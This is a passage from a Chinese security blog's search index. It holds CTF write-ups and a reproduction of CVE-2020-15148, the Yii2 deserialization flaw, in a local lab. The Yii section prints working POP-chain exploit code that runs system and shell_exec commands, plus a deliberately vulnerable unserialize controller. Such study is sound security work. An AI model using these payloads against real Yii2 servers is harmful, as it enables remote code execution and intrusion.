\x0f\\x0f\\x0f\\x0f1\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fe\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f5\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f6\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f5\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f8\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f5\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0ff\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f9\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fa\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fa\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f9\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f'\n\nflag = unpad(data, 16)\n# 只打印可见ASCII字符\nprint(''.join(chr(b) for b in flag if 32 <= b <= 126))\n```\n\n### sandwitch\n\n```python\nfrom Crypto.Util.number import *\nimport gmpy2\nflag = b'flag{fake_flag}'\nassert len(flag) == 39\np = getPrime(512)\nq = getPrime(512)\nn = p * q\ne = 0x3\npad1 = b'easy_problem'\npad2 = b'How_to_solve_it'\nc = pow(bytes_to_long(pad1 + flag + pad2),e,n)\nprint(f'n = {n}')\nprint(f'c = {c}')\n\n'''\nn = 130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199\nc = 58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503\n'''\n\n```\n\n一个RSA加密算法，直接使用三明治攻击爆破 RSA 参数，但是不会，只能问ai\n\n![image-20250524173529128](../image/achieve/202411/黄河CTF/image-20250524173529128.png)\n\n## Misc\n\n### small_challenge\n\n附件是一个图片，直接用binwalk分离\n\n![image-20250524174638622](../image/achieve/202411/黄河CTF/image-20250524174638622.png)\n\n拿到一个2.png和flag.zip，但是flag.zip是需要密码的\n\n到这里就没什么思路了，后面发现两个图片长得差不多，尝试合并看看能不能拿到什么线索\n\n![image-20250524175445686](../image/achieve/202411/黄河CTF/image-20250524175445686.png)\n\n拿到一个二维码，拿去解码https://zxing.org/w/decode，然后放到随波逐流里面解码\n\n![a4054464e255846a04436e816bc2f802](../image/achieve/202411/黄河CTF/a4054464e255846a04436e816bc2f802.png)\n\n直接掩码爆破\n\n![image-20250524180614617](../image/achieve/202411/黄河CTF/image-20250524180614617.png)\n\n9h!Y_a_8D就是压缩包密码，解压后拿到flag\n\n### 数学天才\n\n压缩包是一个图片一个txt和一个葵花宝典\n\ntxt文件\n\n```\n小伙子，我看你骨骼清奇，必是旷世奇才，那就考验一下你的悟性吧！\n试炼一：斜下对角线的数字，是打开葵花宝典的密钥。\n试炼二：为师不想要死，为师喜欢$。\n试炼三：你是第60位前来考核的人员，想想该怎么读懂葵花宝典呢？\n```\n\n根据前两个试炼，设置一下字典\n\n![image-20250524181134363](../image/achieve/202411/黄河CTF/image-20250524181134363.png)\n\n根据第三个试炼，猜测长度是60\n\n![image-20250524181308273](../image/achieve/202411/黄河CTF/image-20250524181308273.png)\n\n直接爆出密码，解压后拿到一串字符串\n\n```\nDJ?ELtbo`0+o8F0Eb2G9dPN\n```\n\n放随波逐流解密\n\n```\nRot47解码:\t\tsynt{E3@1_Z@gu_t3avh5!}\n```\n\n## Re\n\n### Victory Melody\n\n![8678cc46f5df533b97b10924afb61dad](../image/achieve/202411/黄河CTF/8678cc46f5df533b97b10924afb61dad.png)\n\n分析过后发现先经过sub_7FF76AFD1109才进入if，跟进函数名\n\n![32db772ce1e25731227a24a7c3999757](../image/achieve/202411/黄河CTF/32db772ce1e25731227a24a7c3999757.png)\n\n分析发现这个函数其实就实现了个异或计算的功能\n\n该调教ai了，喊ai写个解释器出来\n\n```python\n# 将十六进制字符串转换为字节码\nbytecode = bytes.fromhex(\n    \"20105B20115820125620136E20141120154E2016004011211000301001301002301003\"\n    \"30100430100530100630100730501007\"\n)\n\n# 初始化虚拟机状态\nr0 = 0  # 寄存器0\nr1 = 0  # 寄存器1\npc = 0  # 程序计数器\nmem = [0] * 0x50C  # 1292 字节内存块\n\n# 虚拟机执行循环\nwhile pc < len(bytecode):\n    instruction = bytecode[pc]\n    print(f\"PC: {hex(pc).ljust(6)} OP: {hex(instruction).ljust(4)}\", end=\" | \")\n\n    if instruction == 0x10:  # MOV r0, immediate\n        r0 = bytecode[pc + 1]\n        print(f\"SET r0 = {hex(r0)}\")\n        pc += 2\n\n    elif instruction == 0x11:  # MOV r1, immediate\n        r1 = bytecode[pc + 1]\n        print(f\"SET r1 = {hex(r1)}\")\n        pc += 2\n\n    elif instruction == 0x20:  # MOV [data + offset], value\n        offset = bytecode[pc + 1]\n        value = bytecode[pc + 2]\n        mem[12 + offset] = value\n        print(f\"STORE {hex(value)} at data+{hex(offset)}\")\n        pc += 3\n\n    elif instruction == 0x30:  # XOR [data + r0], r1\n        mem[12 + r0] ^= r1\n        print(f\"XOR data+{hex(r0)} with {hex(r1)} → {hex(mem[12 + r0])}\")\n        pc += 1\n\n    elif instruction == 0x40:  # CALL sub_7FF76AFD109B\n        print(\"CALL sub_7FF76AFD109B()\")\n        pc += 1\n\n    elif instruction == 0x50:  # COMPARE data[0:length] vs data[offset:offset+length]\n        offset = bytecode[pc + 1]\n        length = bytecode[pc + 2]\n        print(f\"COMPARE data[0:{hex(length)}] vs data[{hex(offset)}:{hex(offset + length)}]\")\n        # 提取可能的 Flag\n        flag = bytes(mem[12:12 + length])\n        print(f\"Possible Flag: {flag.decode()}\")\n        exit()\n\n    else:  # 未知指令\n        print(f\"Unknown instruction: {hex(instruction)}\")\n        break\n\n# 打印内存数据区的前 32 字节\nprint(\"\\nMemory Data Area (hex):\")\nprint(bytes(mem[12:12 + 32]).hex(' '))\n\n```\n\n![image-20250524151128558](../image/achieve/202411/黄河CTF/image-20250524151128558.png)\n\n拿到一些为汇编，然后拿去异或计算拿到zywO0o!，一看就是go学长出的题，把这个拿去md5加密就行了\n\n![image-20250524151349538](../image/achieve/202411/黄河CTF/image-20250524151349538.png)\n\n### qgd\n\n说是签到题，但是一时间没看懂怎么做emmm\n\n附件中提示flag{part1flag/part2flag}，part2flag.exe先解包一下\n\n![image-20250524170535784](../image/achieve/202411/黄河CTF/image-20250524170535784.png)\n\n拿到pyc文件，然后我们反编译\n\nWO0o.pyc\n\n```python\n# Decompiled with PyLingual (https://pylingual.io)\n# Internal filename: WO0o.py\n# Bytecode version: 3.9.0beta5 (3425)\n# Source timestamp: 1970-01-01 00:00:00 UTC (0)\n\nfrom secret import decrypt\nkey = bytes.fromhex('EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD')\nciphertext = b'\\xd4z\\'0L\\x10\\xca\\x0b\\x0b\\xaa\\x15\\xbeK0\"\\xbf\\xb2\\xc6\\x05'\ncipher = decrypt(ciphertext, key)\na = bytes(input('flag呢'), encoding='utf-8')\nif a == cipher:\n    print('没错没错')\nelse:\n    print('不对不对')\n```\n\n可以发现导了⼀个secret，尝试解包secret得到⼀个魔改rc4\n\n```python\n# Decompiled with PyLingual (https://pylingual.io)\n# Internal filename: secret.py\n# Bytecode version: 3.9.0beta5 (3425)\n# Source timestamp: 1970-01-01 00:00:00 UTC (0)\n\ndef key_schedule(key: bytes) -> list:\n    S = list(range(128))\n    v6 = 0\n    for j in range(128):\n        v6 = (S[j] + key[j % len(key)] + v6) % 128\n        v6 = (v6 ^ 55) % 128\n        S[j], S[v6] = (S[v6], S[j])\n    return S\n\ndef next_byte(state: dict) -> int:\n    S = state['S']\n    state['i'] = (state['i'] + 1) % 128\n    state['j'] = (state['j'] + S[state['i']]) % 128\n    S[state['i']], S[state['j']] = (S[state['j']], S[state['i']])\n    v2 = S[(S[state['i']] + S[state['j']]) % 128]\n    return (16 * v2 | v2 >> 4) & 255\n\ndef decrypt(ciphertext: bytes, key: bytes) -> bytes:\n    state = {'S': key_schedule(key), 'i': 0, 'j': 0}\n    plaintext = bytearray()\n    for byte in ciphertext:\n        plaintext.append(byte ^ next_byte(state))\n    return bytes(plaintext)\n```\n\nRC4其实是一种对称加密技术，所以他们的加解密的过程其实是一样的，将函数直接全部复制下来就⾏，把数据传进去\n\nexp\n\n```python\n# Decompiled with PyLingual (https://pylingual.io)\n# Internal filename: secret.py\n# Bytecode version: 3.9.0beta5 (3425)\n# Source timestamp: 1970-01-01 00:00:00 UTC (0)\n\ndef key_schedule(key: bytes) -> list:\n    S = list(range(128))\n    v6 = 0\n    for j in range(128):\n        v6 = (S[j] + key[j % len(key)] + v6) % 128\n        v6 = (v6 ^ 55) % 128\n        S[j], S[v6] = (S[v6], S[j])\n    return S\n\ndef next_byte(state: dict) -> int:\n    S = state['S']\n    state['i'] = (state['i'] + 1) % 128\n    state['j'] = (state['j'] + S[state['i']]) % 128\n    S[state['i']], S[state['j']] = (S[state['j']], S[state['i']])\n    v2 = S[(S[state['i']] + S[state['j']]) % 128]\n    return (16 * v2 | v2 >> 4) & 255\n\ndef decrypt(ciphertext: bytes, key: bytes) -> bytes:\n    state = {'S': key_schedule(key), 'i': 0, 'j': 0}\n    plaintext = bytearray()\n    for byte in ciphertext:\n        plaintext.append(byte ^ next_byte(state))\n    return bytes(plaintext)\n\nkey = bytes.fromhex('EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD')\nciphertext = b'\\xd4z\\'0L\\x10\\xca\\x0b\\x0b\\xaa\\x15\\xbeK0\"\\xbf\\xb2\\xc6\\x05'\ncipher = decrypt(ciphertext, key)\nprint(ciphertext)\nprint(cipher)\n```\n\n![image-20250524171907749](../image/achieve/202411/黄河CTF/image-20250524171907749.png)\n\n这里就拿到后半段flag了，前半段flag的话一直没搞明白，一直问ai之后发现这里是异或算法\n\n![image-20250524172356346](../image/achieve/202411/黄河CTF/image-20250524172356346.png)\n\n![image-20250524172609761](../image/achieve/202411/黄河CTF/image-20250524172609761.png)\n\n解密脚本\n\n```python\nencrypted_flag = [88, 47, 80, 54, 95, 57, 90, 54, 94, 47]\nkey_even = 0x31  # 偶数位密钥\nkey_odd = 0x58   # 奇数位密钥\n\ndecrypted_flag = []\nfor i, byte in enumerate(encrypted_flag):\n    if i % 2 == 0:  # 偶数位\n        decrypted_byte = byte ^ key_even\n    else:  # 奇数位\n        decrypted_byte = byte ^ key_odd\n    decrypted_flag.append(chr(decrypted_byte))\n\nprint(\"Decrypted Flag:\", ''.join(decrypted_flag))\n\n```\n\n![image-20250524172634153](../image/achieve/202411/黄河CTF/image-20250524172634153-1748078795206-11.png)\n\n最终flag：`flag{iwannaknow/what_DO_you_mean#@!}`\n\n","tags":["第三届黄河CTF"],"categories":["赛题wp"]},{"title":"PHP反序列化-Yii框架","url":"/2025/05/23/PHP反序列化-Yii框架/","content":"\nCVE-2020-15148也算是一个很老的漏洞了，一个Yii框架的反序列化漏洞，最近一直在审框架，所以还是很乐意去复现这个框架漏洞的\n\n## 0x01Yii框架\n\n先放一些啰嗦话，下面是官方对yii的介绍\n\nYii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。 名字 Yii （读作 `易`）在中文里有“极致简单与不断演变”两重含义， 也可看作 **Yes It Is**! 的缩写。Yii 是一个通用的 Web 编程框架，即可以用于开发各种用 PHP 构建的 Web 应用。 因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。\n\n官方网站：https://www.yiiframework.com/\n\nYii 当前有两个主要版本：1.1 和 2.0。 1.1 版是上代的老版本，现在处于维护状态。 2.0 版是一个完全重写的版本，采用了最新的技术和协议，包括依赖包管理器 Composer、PHP 代码规范 PSR、命名空间、Traits（特质）等等。\n\n## 0x02漏洞描述\n\n**Yii2 2.0.38 之前的版本**存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。也就是我们的CVE-2020-15148\n\n另外需要注意的是PHP的版本，Yii 2.0 需要 PHP 7.3.0 或以上版本支持。\n\n## 0x03靶场搭建\n\n版本：2.0.37\n\n其实很简单，我们先下载一个存在漏洞的版本(2.0.37)\n\nGithub地址：https://github.com/yiisoft/yii2/releases/tag/2.0.37\n\n有两种方法，一是用composer下载2.0.37源码\n\n```\ncomposer create-project --prefer-dist yiisoft/yii2-app-basic basic 2.0.37\n```\n\n二是下载源码\n\n如果是从github下载源码的话需要配置密钥\n\n![image-20250523125233828](../image/achieve/202411/CVE复现/image-20250523125233828.png)\n\n安装好后我们运行框架\n\n```\nphp yii serve\n```\n\n这里卡了一会，后面发现我的php8.1版本的不行，得换成7.3左右的\n\n服了，vps一直有报错，不得不转战物理机\n\n![image-20250523133032813](../image/achieve/202411/CVE复现/image-20250523133032813.png)\n\n访问8080端口就可以了\n\n## 0x04漏洞利用\n\n### BatchQueryResult.php::__destruct()\n\n漏洞的出发点是在`\\vendor\\yiisoft\\yii2\\db\\BatchQueryResult.php`文件中\n\n![image-20250523133239812](../image/achieve/202411/CVE复现/image-20250523133239812.png)\n\n`__destruct()`：当对象被销毁时会自动调用。\n\n一般来说反序列化的起点都是`__destruct`魔术方法，为什么不是`__wakeup`方法呢？其实这个跟开发习惯有关，一般来说`__wakeup`都是被用作一种反序列化的限制手段，所以常常反序列化的起点都是从`__destruct`方法开始的\n\n然后我们跟进一下reset()函数\n\n![image-20250523133502465](../image/achieve/202411/CVE复现/image-20250523133502465.png)\n\n`__call()魔术方法`：在对象中调用一个不可访问方法时调用\n\n代码92行调用了`_dataReader`属性的close方法，但是这里的`_dataReader`属性的值是可控的，所以是否能触发`__call()`魔术方法呢？这里跟进close()方法发现\n\n![image-20250523134001570](../image/achieve/202411/CVE复现/image-20250523134001570.png)\n\n存在close()方法的类并没有和我们利用的类有父子类关系，所以close()在这里是不可访问的方法，那么就会触发call()方法\n\n所以我们全局搜索一下`__call()`方法，看看有没有能用的\n\n![image-20250523140555961](../image/achieve/202411/CVE复现/image-20250523140555961.png)\n\n### Generator.php::__call()\n\n在**/vendor/fzaninotto/faker/src/Faker/Generator.php**下找到一个可利用的`__call()方法`\n\n```php\npublic function __call($method, $attributes)\n{\n    return $this->format($method, $attributes);\n}\n```\n\n跟进fomat方法\n\n在同文件下找到\n\n```php\npublic function format($formatter, $arguments = array())\n{\n    return call_user_func_array($this->getFormatter($formatter), $arguments);\n}\n```\n\n这里有一个`call_user_func_array`函数\n\n![image-20250523140833824](../image/achieve/202411/CVE复现/image-20250523140833824.png)\n\n本地测试一下\n\n```php\n<?php\nclass test{\n    public function test(){\n        phpinfo();\n    }\n}\n//$a = new test();\n//$a->test();\ncall_user_func_array(phpinfo,array());\n```\n\n当然如果是调用类中的方法可以将第一个参数设置为数组\n\n```php\n<?php\nclass test{\n    public function test(){\n        phpinfo();\n    }\n}\n//$a = new test();\n//$a->test();\ncall_user_func_array(array(new test(),'test'),array());\n//成功执行\n```\n\n一个可以调用函数的函数，但是这里$arguments并不可控，如果打无参数RCE就比较恶心，但是可以通过这个方法去当跳板去打\n\n然后可以查找call_user_func的无参函数\n\n![image-20250523141646907](../image/achieve/202411/CVE复现/image-20250523141646907.png)\n\n我发现有两个地方的run方法都可以进行rce，先讲第一个\n\n### CreateAction::run()\n\n找到CreateAction类下的run方法\n\n```php\npublic function run()\n{\n    if ($this->checkAccess) {\n        call_user_func($this->checkAccess, $this->id);\n    }\n```\n\n查看之后发现里面的两个属性都是可控的，那么就可以构造链子\n\n## 0x05exp编写\n\n### 链子1\n\n```\nBatchQueryResult::__destruct()->BatchQueryResult::reset()->Gernerator::__call->Gernerator::format()->CreateAction::run()\n```\n\n### POC1\n\n```php\n<?php\nnamespace yii\\rest{\n    class CreateAction {\n        public $checkAccess;\n        public $id;\n        public function __construct($id, $checkAccess){\n            $this->id = 'whoami';\n            $this->checkAccess = 'system';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n    class Generator{\n        protected $formatters=array();\n\n        public function __construct(){\n            $this->formatters['close'] = [new CreateAction() , 'run()'];\n        }\n    }\n}\n\nnamespace yii\\db {\n\n    use Faker\\Generator;\n\n    ues Faker\\Generator;\n    class BatchQueryResult {\n        private $_dataReader;\n        public function __construct(){\n            $this->_dataReader = new Generator();\n        }\n    }\n}\n\nnamespace {\n    use yii\\db\\BatchQueryResult;\n    echo urlencode(base64_encode(serialize(new BatchQueryResult())));\n}\n\n```\n\n然后我们写一个反序列化的入口，在controllers目录下新建一个存在反序列化点的TestController.php\n\n```php\n<?php\n\nnamespace app\\controllers;\n\nuse yii\\web\\Controller;\n\nclass TestController extends Controller{\n    public function actionTest($data){\n        return unserialize(base64_decode($data));\n    }\n}\n```\n\n在yii框架中默认URL格式使用一个参数`r`表示路由， 并且使用一般的参数格式表示请求参数。例如，`/index.php?r=post/view&id=100`表示路由为`post/view`，参数`id`为100。\n\n然后访问/index.php?r=test/test\n\n传入payload\n\n![image-20250523150210290](../image/achieve/202411/CVE复现/image-20250523150210290.png)\n\n然后我们解释一下exp\n\n先是由BatchQueryResult类的`__destruct`方法触发`__reset()`方法，然后我们设置`__dataReaderc`参数为Generator类，触发Generator类中的`__call`方法，`__call`方法会返回format方法执行的结果，我们跟进format方法\n\n```php\npublic function format($formatter, $arguments = array())\n{\n    return call_user_func_array($this->getFormatter($formatter), $arguments);\n}\n```\n\n发现format方法的参数一是getFormatter中的$formatter，并且这里利用了call_user_func_array，我们继续跟进getFormatter方法\n\n```php\npublic function getFormatter($formatter)\n    {\n        if (isset($this->formatters[$formatter])) {\n            return $this->formatters[$formatter];\n        }\n        foreach ($this->providers as $provider) {\n            if (method_exists($provider, $formatter)) {\n                $this->formatters[$formatter] = array($provider, $formatter);\n\n                return $this->formatters[$formatter];\n            }\n        }\n        throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));\n    }\n```\n\n这里可以看到`formatters[$formatter]`是可控的，所以我们可以利用`formatters[$formatter]`属性配合call_user_func_array函数去调用CreateAction中的run方法\n\n```php\npublic function run()\n{\n    if ($this->checkAccess) {\n        call_user_func($this->checkAccess, $this->id);\n    }\n```\n\n在run方法中调用了call_user_func函数，并且两个参数可控，从而可以进行RCE\n\n到这里我以为只有这个方法了，但是我返回去继续翻找了一下，发现在IndexAction.php下还有一个可利用的\n\n![image-20250523151101124](../image/achieve/202411/CVE复现/image-20250523151101124.png)\n\n### IndexAction.php::run()\n\n其实和CreateAction是一样的，都是继承了Action的子类，参数是共同的，所以这里就不作过多赘述了\n\n### 链子2\n\n```php\nBatchQueryResult::__destruct()->BatchQueryResult::reset()->Gernerator::__call->Gernerator::format()->IndexAction.php::run()\n```\n\n### POC2\n\n```php\n<?php\n\nnamespace yii\\rest{\n    class IndexAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess = 'shell_exec';\n            $this->id = 'cat /flag | tee 1';\t\t\t\t//命令执行\n        }\n    }\n}\nnamespace Faker {\n\n    use yii\\rest\\IndexAction;\n\n    class Generator\n    {\n        protected $formatters;\n\n        public function __construct()\n        {\n            $this->formatters['close'] = [new IndexAction(), 'run'];\n        }\n    }\n}\nnamespace yii\\db{\n\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n        public function __construct()\n        {\n            $this->_dataReader=new Generator();\n        }\n    }\n}\nnamespace{\n\n    use yii\\db\\BatchQueryResult;\n\n    echo base64_encode(serialize(new BatchQueryResult()));\n}\n```\n\n## 0x06漏洞修复\n\n2.0.38已修复，官方给`yii\\db\\BatchQueryResult`类加了一个`__wakeup()`函数，`__wakeup`方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当BatchQueryResult类被反序列化时就直接报错，避免反序列化的发生，也就避免了漏洞。\n\n## 0x07扩展poc1\n\n在web267的时候用上面的链子是能打的，但是在web268调用的时候发现打不通了，说明这个yii框架还是可以继续挖掘链子的\n\n在我继续搜索依靠`__destruct()`触发`__call()`方法的时候，发现在RunProcess类中的`__destruct()`似乎可以触发`__call()`方法\n\n```php\npublic function __destruct()\n{\n    $this->stopProcess();\n}\n```\n\n跟进stopProcess()\n\n```php\npublic function stopProcess()\n{\n    foreach (array_reverse($this->processes) as $process) {\n        /** @var $process Process  **/\n        if (!$process->isRunning()) {\n            continue;\n        }\n        $this->output->debug('[RunProcess] Stopping ' . $process->getCommandLine());\n        $process->stop();\n    }\n    $this->processes = [];\n}\n```\n\n这里看到`!$process->isRunning()`跟进isRunning()发现找不到，那这里是否可以触发`__call()`呢？\n\n跟进processes属性\n\n```\nprivate $processes = [];\n```\n\n可以看到这里是可控的\n\n那我们直接写poc\n\n```php\n<?php\n\nnamespace yii\\rest{\n    class IndexAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess = 'shell_exec';\n            $this->id = 'ls / | tee 1.txt';\t\t\t\t//命令执行\n        }\n    }\n}\nnamespace Faker {\n\n    use yii\\rest\\IndexAction;\n\n    class Generator\n    {\n        protected $formatters;\n\n        public function __construct()\n        {\n            $this->formatters['isRunning'] = [new IndexAction(), 'run'];\n        }\n    }\n}\n\nnamespace Codeception\\Extension{\n\n    use Faker\\Generator;\n    class RunProcess\n    {\n        private $processes = [];\n        public function __construct(){\n            $this->processes[]=new Generator();\n        }\n    }\n}\n\nnamespace {\n    use Codeception\\Extension\\RunProcess;\n\n    echo urlencode(base64_encode(serialize(new RunProcess())));\n}\n```\n\n在调试的过程中我遇到了一个问题\n\n```\nexp1\n$this->formatters['close'] = [new IndexAction(), 'run'];\nexp2\n$this->formatters['isRunning'] = [new IndexAction(), 'run'];\n```\n\n我一直没搞明白这里的键的设置是为什么，然后我去翻看了`__call()`方法的说明，发现如果我们设置`__call()`的第一个参数为一个不可访问的函数的时候，就会触发`__call()`方法，而在这里的`__call`方法中有一个$method参数，这个参数就来自于format方法的$formatter，并来自于getFormatter的$formatter，也就是formatters数组中的键close和isRunning\n\n## 0x08扩展poc2\n\n我又回来了，不得不说这个链子还是很多的\n\n先放poc吧，这个poc确实想不到了\n\nhttps://blog.csdn.net/cosmoslin/article/details/120612714\n\n```php\n<?php\nnamespace yii\\rest {\n    class IndexAction\n    {\n        public function __construct()\n        {\n            $this->checkAccess = \"system\";\n            $this->id = \"whoami\";\t\t//RCE\n        }\n    }\n}\nnamespace yii\\web {\n    use yii\\rest\\IndexAction;\n    abstract class MultiFieldSession\n    {\n        public $writeCallback;\n    }\n    class DbSession extends MultiFieldSession\n    {\n        public function __construct()\n        {\n            $this->writeCallback = [new IndexAction(), \"run\"];\n        }\n    }\n}\nnamespace yii\\db {\n    use yii\\base\\BaseObject;\n    use yii\\web\\DbSession;\n    class BatchQueryResult\n    {\n        private $_dataReader;\n        public function __construct()\n        {\n            $this->_dataReader = new DbSession();\n        }\n    }\n}\nnamespace {\n    use yii\\db\\BatchQueryResult;\n    echo(base64_encode(serialize(new BatchQueryResult())));\n}\n```\n\n然后我们回去分析一下\n\n这次不是找入口了，这次是找触发出口的中间链，链子的入口还是在BatchQueryResult的`__destruct()`，然后这里的话我们看看DbSession类\n\n然后我发现这里并不是要触发`__call()`方法，而是要利用BatchQueryResult::reset()中的close()，去调用DbSession中的close()，我们看看close()\n\n```php\npublic function close()\n{\n    if ($this->getIsActive()) {\n        // prepare writeCallback fields before session closes\n        $this->fields = $this->composeFields();\n        YII_DEBUG ? session_write_close() : @session_write_close();\n    }\n}\n```\n\n这里的话挨个跟进一下发现在composeFields()方法\n\n```php\nprotected function composeFields($id = null, $data = null)\n{\n    $fields = $this->writeCallback ? call_user_func($this->writeCallback, $this) : [];\n    if ($id !== null) {\n        $fields['id'] = $id;\n    }\n    if ($data !== null) {\n        $fields['data'] = $data;\n    }\n    return $fields;\n}\n```\n\n这里有call_user_func，然后可以利用这个函数去调用IndexAction中的run()函数，所以最终的链子就是\n\n```\nBatchQueryResult::__destruct()->BatchQueryResult::reset()->DbSession::close()->MultiFieldSession::composeFields()->IndexAction::run()\n```\n\n","tags":["Yii框架"],"categories":["PHP反序列化"]},{"title":"ctfshow入门反序列化","url":"/2025/05/21/ctfshow入门反序列化/","content":"\n其实也是二刷，因为这阵子对反序列化的理解更透彻了，想刷一下看看有没有什么新的收获\n\n前面部分题的话之前第一篇写的很详细，新手可以去看那篇\n\nhttps://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-ctfshow/\n\n## web254\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-02 17:44:47\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-02 19:29:02\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        if($this->username===$u&&$this->password===$p){\n            $this->isVip=true;\n        }\n        return $this->isVip;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = new ctfShowUser();\n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n```\n\n可以看到这里会经过login方法，所以需要通过验证\n\n```\n$this->username===$u&&$this->password===$p\n```\n\n所以直接传参设置就行\n\n```\n$u='xxxxxx';\n$p='xxxxxx';\n?username=xxxxxx&password=xxxxxx\n```\n\n## web255\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-02 17:44:47\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-02 19:29:02\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n```\n\n会反序列化cookie中的user，所以只要传入的序列化字符串的username和password等于我们get传入的参数username和password并且isVip=true就行\n\n```php\n<?php\nclass ctfShowUser{\n    public $username = '123123';\n    public $password = '123123';\n    public $isVip = true;\n}\n$a = new ctfShowUser();\necho urlencode(serialize($a));\n```\n\n这里需要进行url编码再传入cookie，否则会出错\n\n```\nGET /?username=123123&password=123123 HTTP/1.1\nHost: a1f8f9fd-b23d-45c5-8dbd-81b2e737f0ea.challenge.ctf.show\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nCookie: 